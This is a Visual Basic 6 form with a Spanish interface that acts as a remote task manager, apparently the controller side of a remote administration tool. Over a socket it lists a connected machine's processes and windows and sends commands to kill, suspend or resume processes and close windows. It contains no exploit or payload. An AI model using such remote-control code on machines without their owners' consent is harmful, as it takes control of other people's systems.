VERSION 5.00
Begin VB.Form FrmProcess 
   Caption         =   "Administrador de tareas"
   ClientHeight    =   8490
   ClientLeft      =   60
   ClientTop       =   405
   ClientWidth     =   9420
   LinkTopic       =   "Form1"
   ScaleHeight     =   8490
   ScaleWidth      =   9420
   StartUpPosition =   3  'Windows Default
   Begin Servidor.TabStrip TabStrip1 
      Height          =   7935
      Left            =   0
      TabIndex        =   1
      Top             =   0
      Width           =   9255
      _ExtentX        =   16325
      _ExtentY        =   13996
      Begin Servidor.ucListView ucListView2 
         Height          =   5295
         Left            =   2880
         TabIndex        =   2
         Top             =   1800
         Width           =   5415
         _ExtentX        =   9551
         _ExtentY        =   9340
      End
      Begin Servidor.ucListView ucListView1 
         Height          =   6135
         Left            =   120
         TabIndex        =   0
         Top             =   240
         Width           =   6495
         _ExtentX        =   11456
         _ExtentY        =   10821
      End
   End
   Begin Servidor.ucStatusbar ucStatusbar1 
      Align           =   2  'Align Bottom
      Height          =   405
      Left            =   0
      Top             =   8085
      Width           =   9420
      _ExtentX        =   16616
      _ExtentY        =   714
   End
End
Attribute VB_Name = "FrmProcess"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Const WS_MINIMIZE As Long = &H20000000
Private Const WS_MAXIMIZE As Long = &H1000000

Private Enum SYSCOMMAND
    SC_MINIMIZE = &HF020&
    SC_MAXIMIZE = &HF030&
    SC_CLOSE = &HF060&
    SC_RESTORE = &HF120&
End Enum

Public ParentID                 As Long
Public SocketID                 As Long
Private m_Data                  As String
Private hForeGroundWindow       As Long
Private ClientProccesID         As Long
Private cMenuImage              As clsMenuImage
Private cImgList                As clsImgList


Public Sub Socket_DataArrival(id As Long, IP As String, Puerto As String, Data As String)
    On Error GoTo ErrHaddle
    
    Dim lRet1       As Long
    Dim lRet2       As Long
    Dim sCommand    As String
    Dim sBuf        As String
    Dim vData()     As String
    Dim ImageStream() As Byte
    
    m_Data = m_Data & Data

    lRet1 = InStr(m_Data, END_DATA)
    
    If lRet1 Then
   
        sBuf = Left$(m_Data, lRet1 - 1)
        m_Data = Mid$(m_Data, lRet1 + Len(END_DATA))

        lRet2 = InStr(sBuf, Delimiter)
        sCommand = Left$(sBuf, lRet2 - 1)
        sBuf = Mid$(sBuf, lRet2 + 1)

        Select Case sCommand
        
            Case 0
                ucListView1.InitializeImageListSmall
                ImageStream = StrConv(sBuf, vbFromUnicode)
                ucListView1.ImageListSmall_AddBitmap LoadPictureFromStream(ImageStream), vbWhite
            Case 1
                CompleteListViewProcess sBuf
            Case 2
   
                MsgBox "No se pudo terminar el proceso", vbCritical, "Error al terminar un proceso"
                DoEvents
                Me.SetFocus
            Case 3
                ucStatusbar1.PanelText(2) = "Uso de CPU: " & sBuf & " %"
            
            Case 4
                ucStatusbar1.PanelText(3) = "Memoria libre: " & sBuf & " %"
            Case 5
                ucListView2.InitializeImageListSmall
                ImageStream = StrConv(sBuf, vbFromUnicode)
                ucListView2.ImageListSmall_AddBitmap LoadPictureFromStream(ImageStream), vbWhite
            Case 6
                CompleteListViewWindows sBuf
            Case 7
                hForeGroundWindow = CLng(sBuf)
                ucListView2.Refresh
            Case 8
                ClientProccesID = CLng(sBuf)
            Case 9
                TabStrip1.SelectedItem = 1
                ucListView1.SetFocus
        End Select
    
        If Len(m_Data) Then
            If InStr(m_Data, END_DATA) Then Call Me.Socket_DataArrival(id, IP, Puerto, vbNullString)
        End If
        
    End If
    
ErrHaddle:
End Sub


Private Sub CompleteListViewWindows(ByVal sData As String)
    Dim vData() As String
    Dim sSplitData() As String
    Dim i As Long, j As Long
    Dim lCount As Long
    
    sSplitData = Split(sData, vbCrLf)
    
    With ucListView2
        .Clear
        For i = 0 To UBound(sSplitData) - 1
        
            vData = Split(sSplitData(i), Delimiter)
            lCount = .Count
            .ItemAdd lCount, vData(0), 0, lCount, vData(3)
            .SubItemText(lCount, 1) = vData(1)
            .SubItemText(lCount, 2) = GetWindowState(vData(2))
            
        Next
        '.Sort 0, soAscending, stString

    End With

End Sub

Private Function GetWindowState(ByVal lStyle As Long) As String
    If (lStyle And WS_MINIMIZE) = WS_MINIMIZE Then
        GetWindowState = "Minizado"
    ElseIf (lStyle And WS_MAXIMIZE) = WS_MAXIMIZE Then
        GetWindowState = "Maximizado"
    Else
        GetWindowState = "Normal"
    End If
End Function

Private Sub CompleteListViewProcess(ByVal sData As String)
    Dim vData() As String
    Dim sSplitData() As String
    Dim i As Long, j As Long
    Dim lCount As Long
    
    sSplitData = Split(sData, vbCrLf)
    
    With ucListView1
        .Clear
        For i = 0 To UBound(sSplitData) - 1
        
            vData = Split(sSplitData(i), Delimiter)
            lCount = .Count
            .ItemAdd lCount, vData(0), 0, lCount, lCount
            .SubItemText(lCount, 1) = vData(1)
            .SubItemText(lCount, 2) = vData(2)
            .SubItemText(lCount, 3) = Format(vData(3), "##,###,##0") & " KB"
            .SubItemText(lCount, 4) = vData(4)
            .SubItemText(lCount, 5) = vData(5)
        Next
        '.Sort 0, soAscending, stString
        
        ucStatusbar1.PanelText(1) = "Procesos: " & .Count
    End With
    
    
End Sub

Public Sub Socket_Close(id As Long, IP As String, Puerto As String)
    Me.Caption = "Administrador de tareas - Sin conexión"
    ucListView2.Enabled = False
    ucListView1.Enabled = False
    TerminateConnection SocketID
    SocketID = 0
End Sub

Private Sub Command1_Click()
    Call WinSock32.SendData(SocketID, "3" & Delimiter & END_DATA)
End Sub

Private Sub Form_Load()
    Dim hIcon As Long
    Dim i As Long
      
    With TabStrip1
        '.hImageList = cImgList.hwnd
        .AddTab 0, "Aplicaciones", , 0
        .AddTab 1, "Procesos", , 1
    End With

    With ucListView1
    
        .Initialize
        .InitializeImageListSmall 16, 16
        .ViewMode = vmDetails
        .FullRowSelect = True
        .ColumnAdd 0, "Nombre de imágen", 150
        .ColumnAdd 1, "PID", 50, caRight
        .ColumnAdd 2, "Nombre de usuario", 120
        .ColumnAdd 3, "Uso de memoria", 95, caRight
        .ColumnAdd 4, "Subprocesos", 80, caRight
        .ColumnAdd 5, "Ubicación", 300
        .RaiseSubItemPrePaint = True
        If OS_Version > 5 Then Call SetWindowTheme(.hwnd, StrPtr("explorer"), 0)
    End With
    
    With ucListView2
        .Initialize
        .InitializeImageListSmall 16, 16
        .ViewMode = vmDetails
        .FullRowSelect = True
        .ColumnAdd 0, "Tarea", 250
        .ColumnAdd 1, "Handle", 150, caRight
        .ColumnAdd 1, "Estado", 150
        .RaiseSubItemPrePaint = True
        If OS_Version > 5 Then Call SetWindowTheme(.hwnd, StrPtr("explorer"), 0)
    End With
    
    With ucStatusbar1
        Call .Initialize(SizeGrip:=True)
        Call .AddPanel(, , , [sbSpring], "RemoteIP", , 0)
        Call .AddPanel(, 200, , [sbContents])
        Call .AddPanel(, 200, , [sbContents])
    End With
    
    Set cMenuImage = New clsMenuImage
    Set cImgList = New clsImgList

    
    cImgList.Init 16, 16
    cImgList.AddBitmap LoadResPicture(14, vbResBitmap)
    

    
    With cMenuImage
        .Init Me.hwnd, 16, 16

        For i = 0 To 14
            hIcon = cImgList.GetIcon(i)
            .AddIconFromHandle hIcon, , True
            DestroyIcon hIcon
        Next
    End With

    Call WinSock32.SendData(SocketID, "4" & Delimiter & END_DATA) 'Get the Current ProcessId of client

    MdlINI.ReadFormPosAndSize Me
End Sub

Private Sub Form_Resize()
    On Error Resume Next
    TabStrip1.Move 0, 0, Me.ScaleWidth, Me.ScaleHeight - ucStatusbar1.Height
    ucListView1.Move 50, 370, Me.ScaleWidth - 100, Me.ScaleHeight - ucStatusbar1.Height - 470
    ucListView2.Move 50, 370, Me.ScaleWidth - 100, Me.ScaleHeight - ucStatusbar1.Height - 470
End Sub

Private Sub Form_Unload(Cancel As Integer)
    If SocketID Then
        Call WinSock32.SendData(SocketID, "1" & Delimiter & END_DATA)
        TerminateConnection SocketID
        WinSock32.WsClose SocketID
    End If
    MdlINI.SaveFormPosAndSize Me
End Sub

Private Function ShowPopUpMenu(ByVal MenuType As Long) As Long
    Dim hMenu As Long
    Dim hSubMenu1 As Long
    Dim hSubMenu2 As Long
    Dim PT As POINTAPI
    Dim IsValidKey As Boolean
    Dim MnuState As Long
    
    hMenu = CreatePopupMenu()

    Select Case MenuType
    
        Case 1

            AppendMenu hMenu, MF_STRING, 1, "Actualizar"
            AppendMenu hMenu, MF_SEPARATOR, 100, ByVal 0&
            AppendMenu hMenu, MF_STRING, 2, "Terminar proceso"
            AppendMenu hMenu, MF_STRING, 3, "Reanudar"
            AppendMenu hMenu, MF_STRING, 4, "Suspender"


            With cMenuImage

                If Not .IsWindowVistaOrLater Then
                    .RemoveMenuCheckApi hMenu
                End If
                
                .PutImageToApiMenu 1, hMenu, 0
                .PutImageToApiMenu 0, hMenu, 2
                .PutImageToApiMenu 2, hMenu, 3
                .PutImageToApiMenu 3, hMenu, 4

                
            End With
            
        Case 2
           AppendMenu hMenu, MF_STRING, 1, "Actualizar"
           AppendMenu hMenu, MF_SEPARATOR, 100, ByVal 0&
           AppendMenu hMenu, MF_STRING, 2, "Traer al frente"
           AppendMenu hMenu, MF_SEPARATOR, 100, ByVal 0&
           AppendMenu hMenu, MF_STRING, 3, "Minimizar"
           AppendMenu hMenu, MF_STRING, 4, "Maximizar"
           AppendMenu hMenu, MF_STRING, 5, "Cerrar"
           AppendMenu hMenu, MF_SEPARATOR, 100, ByVal 0&
           AppendMenu hMenu, MF_STRING, 6, "Ir al proceso"
            
            With cMenuImage

                If Not .IsWindowVistaOrLater Then .RemoveMenuCheckApi hMenu

                .PutImageToApiMenu 1, hMenu, 0
                .PutImageToApiMenu 4, hMenu, 2
                .PutImageToApiMenu 5, hMenu, 4
                .PutImageToApiMenu 6, hMenu, 5
                .PutImageToApiMenu 0, hMenu, 6
                .PutImageToApiMenu 7, hMenu, 8
                
            End With

    End Select

    GetCursorPos PT
    ShowPopUpMenu = TrackPopupMenuEx(hMenu, TPM_RETURNCMD, PT.X, PT.Y, Me.hwnd, ByVal 0&)
    Debug.Print Now
    DestroyMenu hMenu
End Function

Private Sub TabStrip1_TabClick(ByVal lTab As Long)
    ucListView2.Visible = (lTab = 0)
End Sub

Private Sub ucListView1_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Dim lRet As Long
    Dim Index As Long
    
    
    If Button = vbRightButton Then
        Index = ucListView1.ItemHitTest(X, Y)
        If Index = -1 Then Exit Sub
        'ucListView1.ItemSelected(Index) = True
        lRet = ShowPopUpMenu(1)
        Select Case lRet
            Case 1
                WinSock32.SendData SocketID, "0" & Delimiter & END_DATA
            Case 2
                WinSock32.SendData SocketID, "2" & Delimiter & ucListView1.SubItemText(Index, 1) & END_DATA
            Case 3
                WinSock32.SendData SocketID, "1" & Delimiter & ucListView1.SubItemText(Index, 1) & Delimiter & 0 & END_DATA
            Case 4
                WinSock32.SendData SocketID, "1" & Delimiter & ucListView1.SubItemText(Index, 1) & Delimiter & 1 & END_DATA
        End Select
    End If
End Sub


Private Sub ucListView2_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Dim lRet As Long
    Dim Index As Long
    
    
    If Button = vbRightButton Then
        Index = ucListView2.ItemHitTest(X, Y)
        If Index = -1 Then Exit Sub
        lRet = ShowPopUpMenu(2)
        Select Case lRet
            Case 1
                'WinSock32.SendData SocketID, "0" & Delimiter & END_DATA
            Case 2
                WinSock32.SendData SocketID, "5" & Delimiter & ucListView2.SubItemText(Index, 1) & END_DATA
            Case 3
                WinSock32.SendData SocketID, "6" & Delimiter & ucListView2.SubItemText(Index, 1) & Delimiter & SC_MINIMIZE & END_DATA
            Case 4
                WinSock32.SendData SocketID, "6" & Delimiter & ucListView2.SubItemText(Index, 1) & Delimiter & SC_MAXIMIZE & END_DATA
            Case 5
                WinSock32.SendData SocketID, "6" & Delimiter & ucListView2.SubItemText(Index, 1) & Delimiter & SC_CLOSE & END_DATA
            Case 6
                GotoProcessWindow Index
        End Select
    End If
End Sub

Private Sub GotoProcessWindow(ByVal ListIndex As Long)
    Dim ItemData As Long
    Dim i As Long
    ItemData = ucListView2.ItemData(ListIndex)
    For i = 0 To ucListView1.Count
        If ucListView1.SubItemText(i, 1) = ItemData Then
            ucListView1.ItemSelected(i) = True
            Call ucListView1.ItemEnsureVisible(i)
            TabStrip1.SelectedItem = 1
            ucListView1.SetFocus
            Exit For
        End If
    Next
End Sub

Private Sub ucListView1_OnSubItemPrePaint(ByVal Item As Long, ByVal SubItem As Long, TextBackColor As Long, TextForeColor As Long, Process As Boolean)
    If ucListView1.SubItemText(Item, 1) = ClientProccesID Then
        TextForeColor = vbBlue
        TextBackColor = vbWindowBackground
        Process = True
    End If
End Sub

Private Sub ucListView2_OnSubItemPrePaint(ByVal Item As Long, ByVal SubItem As Long, TextBackColor As Long, TextForeColor As Long, Process As Boolean)
    If ucListView2.SubItemText(Item, 1) = hForeGroundWindow Then
        TextForeColor = vbBlue
        TextBackColor = vbWindowBackground
        Process = True
    End If
End Sub


Private Sub ucListView1_ColumnClick(Column As Long)
    Static m_ColumnSortOrder(5)    As eSortOrderConstants
    Static m_CurrentColumn         As Integer
    Dim nCol As Integer
    
    With ucListView1
        If (.Count > 1) Then

            For nCol = 0 To .ColumnCount - 1
                If (nCol <> Column) Then
                    m_ColumnSortOrder(nCol) = [soDefault] '~None
                    .ColumnIcon(nCol) = -1                '~None
                End If
            Next nCol

            If (m_ColumnSortOrder(Column) = [soAscending]) Then
                m_ColumnSortOrder(Column) = [soDescending]
              Else
                m_ColumnSortOrder(Column) = [soAscending]
            End If
            If Column = 1 Or Column = 4 Then
                Call .Sort(Column, m_ColumnSortOrder(Column), stNumeric)
            Else
                Call .Sort(Column, m_ColumnSortOrder(Column), [stStringSensitive])
            End If
        End If
        m_CurrentColumn = Column
    End With
End Sub

Private Sub ucListView2_ColumnClick(Column As Long)
    Static m_ColumnSortOrder(3)    As eSortOrderConstants
    Static m_CurrentColumn         As Integer
    Dim nCol As Integer
    
    With ucListView2
        If (.Count > 1) Then

            For nCol = 0 To .ColumnCount - 1
                If (nCol <> Column) Then
                    m_ColumnSortOrder(nCol) = [soDefault] '~None
                    .ColumnIcon(nCol) = -1                '~None
                End If
            Next nCol

            If (m_ColumnSortOrder(Column) = [soAscending]) Then
                m_ColumnSortOrder(Column) = [soDescending]
              Else
                m_ColumnSortOrder(Column) = [soAscending]
            End If
            
            If Column = 1 Then
                Call .Sort(Column, m_ColumnSortOrder(Column), stNumeric)
            Else
                Call .Sort(Column, m_ColumnSortOrder(Column), [stStringSensitive])
            End If
            
        End If
        m_CurrentColumn = Column
    End With
End Sub
